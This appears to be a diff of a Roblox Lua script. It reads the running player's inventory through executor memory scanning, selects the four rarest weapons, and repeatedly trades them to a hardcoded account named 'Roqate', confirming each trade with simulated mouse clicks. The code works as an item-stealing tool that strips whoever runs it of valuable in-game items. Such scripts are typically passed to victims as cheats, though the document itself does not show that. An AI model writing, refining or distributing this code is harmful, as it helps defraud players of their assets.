@@ -1,6 +1,5 @@
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UserInputService = game:GetService("UserInputService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Config
@@ -8,8 +7,7 @@ local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
 local TRADE_COOLDOWN = 2
 local ITEM_ADD_DELAY = 0.5
-local UI_WAIT_TIMEOUT = 10
-local ACCEPT_WAIT_TIMEOUT = 20
+local ACCEPT_DELAY = 1
 
 -- Rarity priority
 local RARITY_PRIORITY = { Godly = 1, Ancient = 2, Unique = 3, Classic = 4 }
@@ -22,95 +20,139 @@ local TradeRemotes = {
     OfferItem = ReplicatedStorage:WaitForChild("Trade"):WaitForChild("OfferItem")
 }
 
--- === Inventory Functions === (keep same as before)
-
--- === UI Detection ===
-local function findAcceptButton(gui)
-    -- First try common button names
-    local commonNames = {"Accept", "AcceptButton", "Confirm", "BtnAccept"}
-    for _, name in pairs(commonNames) do
-        local button = gui:FindFirstChild(name, true)
-        if button and button:IsA("TextButton") then
-            return button
-        end
-    end
-    
-    -- Fallback: Search for any button containing "accept"
-    for _, descendant in ipairs(gui:GetDescendants()) do
-        if descendant:IsA("TextButton") and string.find(string.lower(descendant.Text), "accept") then
-            return descendant
+-- Get inventory
+local function getCorrectMyInventory()
+    for _,module in ipairs(getgc(true)) do
+        if type(module) == "table" and rawget(module, "MyInventory") then
+            local inv = module.MyInventory
+            if inv.Data and inv.Data.Weapons and inv.Data.Weapons.Classic then
+                return inv
+            end
         end
     end
     return nil
 end
 
-local function waitForButtonState(button, originalState)
-    local startTime = os.clock()
-    while os.clock() - startTime < ACCEPT_WAIT_TIMEOUT do
-        -- Check if button properties changed (color, text, etc.)
-        if button.BackgroundColor3 ~= originalState.BackgroundColor3 or
-           button.Text ~= originalState.Text or
-           button.TextColor3 ~= originalState.TextColor3 then
-            return true
-        end
-        
-        -- Check if "other player accepted" message appears
-        for _, label in ipairs(button.Parent:GetDescendants()) do
-            if label:IsA("TextLabel") and string.find(string.lower(label.Text), "other player has accepted") then
-                return true
+-- Get top weapons
+local function getTop4Weapons()
+    local inv = getCorrectMyInventory()
+    if not inv then return {} end
+
+    local candidates = {}
+    for _, categoryTable in pairs(inv.Data.Weapons) do
+        for weaponName, weaponData in pairs(categoryTable) do
+            if weaponName ~= "DefaultKnife" and weaponName ~= "DefaultGun" then
+                local rarity = weaponData.Rarity
+                if rarity and ALLOWED_RARITIES[rarity] then
+                    table.insert(candidates, {
+                        name = weaponName,
+                        rarity = rarity,
+                        priority = RARITY_PRIORITY[rarity] or 999
+                    })
+                end
             end
         end
-        
-        task.wait(0.1)
+    end
+
+    table.sort(candidates, function(a,b) return a.priority < b.priority end)
+    
+    local picked = {}
+    for i = 1, math.min(#candidates, MAX_ITEMS_PER_TRADE) do
+        table.insert(picked, candidates[i].name)
+    end
+    return picked
+end
+
+-- Find accept button
+local function findAcceptButton()
+    local gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
+    if not gui then return nil end
+    
+    -- Search for accept button
+    for _, v in ipairs(gui:GetDescendants()) do
+        if v:IsA("TextButton") and string.match(string.lower(v.Text), "accept") then
+            return v
+        end
+    end
+    return nil
+end
+
+-- Click button
+local function clickButton(button)
+    if button then
+        for _ = 1, 2 do -- Double click
+            game:GetService("VirtualInputManager"):SendMouseButtonEvent(
+                button.AbsolutePosition.X + button.AbsoluteSize.X/2,
+                button.AbsolutePosition.Y + button.AbsoluteSize.Y/2,
+                0, true, button, 0
+            )
+            task.wait(0.1)
+            game:GetService("VirtualInputManager"):SendMouseButtonEvent(
+                button.AbsolutePosition.X + button.AbsoluteSize.X/2,
+                button.AbsolutePosition.Y + button.AbsoluteSize.Y/2,
+                0, false, button, 0
+            )
+            task.wait(0.1)
+        end
+        return true
     end
     return false
 end
 
-local function clickButton(button)
-    -- First click
-    button:SetAttribute("LastClicked", os.time())
-    fireclickdetector(button:FindFirstChildOfClass("ClickDetector") or button)
-    task.wait(0.1)
+-- Wait for accept state
+local function waitForAcceptState(button)
+    local startTime = os.clock()
+    local originalColor = button.BackgroundColor3
     
-    -- Second click (double click)
-    button:SetAttribute("LastClicked", os.time())
-    fireclickdetector(button:FindFirstChildOfClass("ClickDetector") or button)
-    print("✅ Double-clicked accept button")
+    while os.clock() - startTime < 20 do
+        -- Check if button color changed
+        if button.BackgroundColor3 ~= originalColor then
+            return true
+        end
+        
+        -- Check for "player accepted" message
+        for _, v in ipairs(button.Parent:GetDescendants()) do
+            if v:IsA("TextLabel") and string.find(string.lower(v.Text), "player has accepted") then
+                return true
+            end
+        end
+        
+        task.wait(0.2)
+    end
+    return false
 end
 
--- === Trade Functions ===
+-- Main trade cycle
 local function doTradeCycle(targetPlayer)
-    print("\n🔄 Starting trade with", targetPlayer.Name)
+    print("\n=== Starting trade cycle ===")
     
-    -- 1. Send trade request
+    -- Send request
     local success, err = pcall(function()
         TradeRemotes.SendRequest:InvokeServer(targetPlayer)
     end)
     if not success then
-        warn("❌ Trade request failed:", err)
+        warn("Trade request failed:", err)
         return
     end
-    print("✅ Request sent - waiting for UI...")
+    print("Sent trade request to", targetPlayer.Name)
     
-    -- 2. Wait for trade GUI
+    -- Wait for GUI
     local startTime = os.clock()
     local gui
-    while os.clock() - startTime < UI_WAIT_TIMEOUT do
+    repeat
         gui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
-        if gui then break end
         task.wait(0.2)
-    end
+    until gui or os.clock() - startTime > 5
     
     if not gui then
-        warn("⚠ Trade GUI not found!")
+        warn("Trade GUI not found")
         return
     end
-    print("✅ Trade GUI found")
     
-    -- 3. Add all items without verification
+    -- Add items
     local weapons = getTop4Weapons()
     if #weapons > 0 then
-        print("➕ Adding items:", table.concat(weapons, ", "))
+        print("Adding items:", table.concat(weapons, ", "))
         for _, weapon in ipairs(weapons) do
             pcall(function()
                 TradeRemotes.OfferItem:FireServer(weapon, "Weapons")
@@ -119,39 +161,37 @@ local function doTradeCycle(targetPlayer)
         end
     end
     
-    -- 4. Find and monitor accept button
-    local acceptButton = findAcceptButton(gui)
+    -- Find accept button
+    local acceptButton
+    startTime = os.clock()
+    repeat
+        acceptButton = findAcceptButton()
+        task.wait(0.2)
+    until acceptButton or os.clock() - startTime > 5
+    
     if not acceptButton then
-        warn("⚠ Accept button not found!")
+        warn("Accept button not found")
         return
     end
     
-    local originalButtonState = {
-        BackgroundColor3 = acceptButton.BackgroundColor3,
-        Text = acceptButton.Text,
-        TextColor3 = acceptButton.TextColor3
-    }
-    
-    print("👀 Monitoring accept button...")
-    if waitForButtonState(acceptButton, originalButtonState) then
-        print("✅ Other player accepted - confirming trade")
+    -- Wait for accept state
+    print("Waiting for accept state...")
+    if waitForAcceptState(acceptButton) then
+        print("Accepting trade")
         clickButton(acceptButton)
     else
-        warn("⚠ Timeout waiting for other player!")
+        warn("Timeout waiting for accept state")
     end
     
-    -- Wait for trade completion
-    task.wait(3)
-    print("✅ Cycle complete\n")
+    print("Trade cycle completed\n")
 end
 
--- === Main Loop ===
-while true do
+-- Main loop
+while task.wait(TRADE_COOLDOWN) do
     local target = Players:FindFirstChild(TARGET_PLAYER)
     if target then
         doTradeCycle(target)
     else
-        print("Waiting for", TARGET_PLAYER, "...")
+        print("Waiting for", TARGET_PLAYER)
     end
-    task.wait(TRADE_COOLDOWN)
 end
